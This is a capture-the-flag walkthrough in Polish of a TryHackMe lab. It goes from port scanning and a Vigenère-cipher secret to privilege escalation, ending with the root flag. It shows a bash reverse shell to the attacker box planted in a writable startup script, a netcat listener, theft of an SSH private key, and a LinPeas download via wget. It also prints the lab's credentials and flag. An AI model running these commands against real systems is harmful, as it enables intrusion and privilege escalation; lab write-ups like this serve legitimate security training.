@@ -1,0 +1,428 @@
+Projekt 6 - Eskalacja pozioma i pionowa
+
+
+*Rekonesans*
+*Na poczatek wykonuje skanowanie za pomoca nmap:*
+```bash
+sudo nmap -sC -sV 10.10.90.142
+```
+
+```bash
+Nmap scan report for 10.10.90.142
+Host is up (0.054s latency).
+Not shown: 916 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
+|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
+|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
+9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9003/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9009/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9010/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9011/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9040/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9050/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9071/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9080/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9081/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9090/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9091/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9099/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9100/tcp  open  jetdirect?
+9101/tcp  open  jetdirect?
+9102/tcp  open  jetdirect?
+9103/tcp  open  jetdirect?
+9110/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9111/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9200/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9207/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9220/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9290/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9415/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9418/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9485/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9500/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9502/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9503/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9535/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9575/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9593/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9594/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9595/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9618/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9666/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9876/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9877/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9878/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9898/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9900/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9917/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9929/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9943/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9944/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9968/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+9998/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+|uptime-agent-info: SSH-2.0-dropbear\x0D
+9999/tcp  open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10000/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10001/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10002/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10003/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10004/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10009/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10010/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10012/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10024/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10025/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10082/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10180/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10215/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10243/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10566/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10616/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10617/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10621/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10626/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10628/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10629/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+10778/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+11110/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+11111/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+11967/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+12000/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+12174/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+12265/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+12345/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+13456/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+13722/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+13782/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
+| ssh-hostkey: 
+|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+*Podłączenie do któregokolwiek portu daje wyjście Lower lub Higher:*
+```bash
+ssh 10.10.90.142 -p 9000 
+```
+1 ⨯
+The authenticity of host '[10.10.90.142]:9000 ([10.10.90.142]:9000)' can't be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.90.142]:9000' (RSA) to the list of known hosts.
+Lower
+Connection to 10.10.90.142 closed.
+
+
+```bash
+ssh 10.10.90.142 -p 11000
+```
+
+The authenticity of host '[10.10.90.142]:11000 ([10.10.90.142]:11000)' can't be established.
+RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:10: [hashed name]
+    ~/.ssh/known_hosts:11: [hashed name]
+    ~/.ssh/known_hosts:12: [hashed name]
+    ~/.ssh/known_hosts:13: [hashed name]
+    ~/.ssh/known_hosts:14: [hashed name]
+    ~/.ssh/known_hosts:15: [hashed name]
+    ~/.ssh/known_hosts:16: [hashed name]
+    ~/.ssh/known_hosts:17: [hashed name]
+    (52 additional names omitted)
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.90.142]:11000' (RSA) to the list of known hosts.
+Higher
+Connection to 10.10.90.142 closed.
+
+
+*Korzystanie z szybkiej pętli Bash for, aby znaleźć dokładny port:*
+```bash
+for i in $(seq 9000 13783); do echo "connecting to port $i"; ssh -o 'LogLevel=ERROR' -o 'StrictHostKeyChecking=no' -p $i test@10.10.90.142;done | grep -vE 'Lower|Higher'
+```
+
+lub ręcznie:
+
+```bash
+ssh -p 9000 10.10.90.142
+```
+
+Port który odpowiedział to 10219.
+Wyświetla się tekst.
+Na dole należy wpisać tajne hasło, więc zakłada się, 
+że trzeba złamać szyfr.
+
+Korzystam z szyfru vigenere:
+www.guballa.de/vigenere-solver
+
+Pod koniec tekstu ujawnia się sekret:
+Your secret is bewareTheJabberwock
+
+Enter Secret: bewareTheJabberwock
+
+Wyświetlone zostały poświadczenia:
+jabberwock:InstanceStartingAsleepWhistle
+
+
+*Logowanie SSH:*
+```bash
+ssh Jabberwock@10.10.90.142 (Działa na AttackBox)
+password: InstanceStartingAsleepWhistle
+cat user.txt
+```
+
+
+**Eskalacja uprawnień:**
+sudo -l
+
+Wygląda również na to, że użytkownik jabberwock może wykonać 
+restart jako root:
+
+```bash
+User jabberwock may run the following commands on looking-glass:
+    (root) NOPASSWD: /sbin/reboot
+```
+
+Skrypt twasBrillig.sh jest modyfikowalny przez bieżącego użytkownika, 
+zmieniam go w celu wykonania odwrotnej powłoki:
+
+```bash
+bash -i >& /dev/tcp/IP Attack Box/443 0>&1
+```
+
+*Kali Linux:*
+```bash
+nc -nvlp 443
+```
+
+Podczas wykonywania /sbin/reboot w celu ponownego uruchomienia systemu, 
+odbierane jest wywołanie zwrotne na odbiorniku Netcat, 
+przyznające powłokę jako użytkownikowi tweedledum.
+
+*Target:*
+```bash
+sudo /sbin/reboot
+```
+
+*Jestem teraz użytkownikiem tweedledum.*
+
+cat humptydumpty.txt
+
+Aby złamać skróty z pliku humptydumpty.txt:
+https://crackstation.net/
+
+Do złamania pozostał skrót:
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+
+Łamie hash za pomocą narzędzia Cyberchef ( HEX ):
+
+Po zdekodowaniu:
+the password is zyxwvutsrqponmlk
+
+*su humptydumpty*
+password: zyxwvutsrqponmlk
+
+W katalogu domowym użytkownika humptydumpty znajduje się plik poetry.txt
+
+Teraz należy przejśc do użytkownika Alice:
+Chociaż folder użytkownika alicji nie pozwala na wyświetlanie 
+listy plików, nadal można uzyskać dostęp do folderu .ssh, wydaje się, że zawiera on prywatny klucz SSH:
+cat .ssh/id_rsa
+
+*Kali LInux:*
+Kopiowanie zawartości pliku id_rsa do nowego pliku.
+vim id_rsa
+chmod 600 id_rsa
+
+Logowanie na konto Alice:
+ssh -i id_rsa alice@10.10.90.142
+
+Teraz należy dokonać enumeracji za pomocą narzędzia LinPeas.sh
+
+*Kali Linux:*
+python3 -m http.server
+
+*Target:*
+wget http://Ip AttackBox:8000/LinPeas.sh
+
+Enumeracja wykazała że istnieje reguła Sudo dla użytkownika alice 
+w pliku: 
+/etc/sudoers.d/alice
+
+Alice może uruchomić /bin/bash jako root, ale tylko 
+na hoście "ssalg-gnikool".
+
+sudo -h ssalg-gnikool /bin/bash
+
+**Zdobyłem roota !!!**
+```bash
+cd /root
+cat root.txt
+Wynik: }<<HIDDEN>>{mht
+
+cat root.txt | rev
+Flaga: thm{bc2337b6f97d057b01da718ced6ead3f}
+```
+
